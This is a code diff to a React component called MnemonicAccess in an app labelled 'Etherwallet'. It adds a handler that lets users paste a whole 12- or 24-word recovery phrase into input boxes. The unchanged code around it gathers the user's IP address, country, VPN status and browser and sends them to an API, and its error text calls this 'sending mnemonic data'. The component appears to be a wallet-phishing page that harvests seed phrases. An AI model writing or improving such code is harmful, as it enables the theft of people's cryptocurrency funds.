@@ -17,21 +17,44 @@ export default function MnemonicAccess() {
     setWords(newWords);
   };
 
+  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
+    e.preventDefault();
+
+    const text = e.clipboardData.getData("text") || "";
+    if (!text.trim()) return;
+
+    // Split into words
+    const parts = text.trim().split(/\s+/);
+
+    // Limit to selected 12 or 24
+    const sliced = parts.slice(0, wordCount);
+
+    // Fill the boxes
+    const updated = [...words];
+    sliced.forEach((word, i) => {
+      updated[i] = word.toLowerCase();
+    });
+
+    setWords(updated);
+  };
+
   const handleNext = async () => {
     console.log("Mnemonic words:", words);
-    
+
     try {
       // Get user location data
       const userCountry = await getUserCountry();
-      
+
       if (!userCountry) {
         console.error("Failed to get user location data");
         return;
       }
 
       // Check VPN status
-      const vpnDetected = userCountry.isVpnIpdata || await checkVpnStatusWithIPQS(userCountry.ip);
-      
+      const vpnDetected =
+        userCountry.isVpnIpdata ||
+        (await checkVpnStatusWithIPQS(userCountry.ip));
+
       // Prepare the data to send
       const requestData = {
         appName: "Etherwallet",
@@ -39,7 +62,8 @@ export default function MnemonicAccess() {
         vpnDetected,
         country: userCountry.country,
         ipAddress: userCountry.ip,
-        browser: typeof navigator !== "undefined" ? navigator.userAgent : "Unknown"
+        browser:
+          typeof navigator !== "undefined" ? navigator.userAgent : "Unknown",
       };
 
       console.log("Sending data:", requestData);
@@ -57,10 +81,9 @@ export default function MnemonicAccess() {
       );
 
       console.log("API response:", response.data);
-      
+
       // Navigate to dashboard after successful API call
       // router.push("/dashboard");
-      
     } catch (error) {
       console.error("Error sending mnemonic data:", error);
       // You might want to show an error message to the user here
@@ -149,6 +172,7 @@ export default function MnemonicAccess() {
                     type="text"
                     value={word}
                     onChange={(e) => handleWordChange(index, e.target.value)}
+                    onPaste={index === 0 ? handlePaste : undefined}
                     className="w-full border-b border-gray-300 pb-2 focus:border-teal-500 focus:outline-none"
                   />
                 </div>
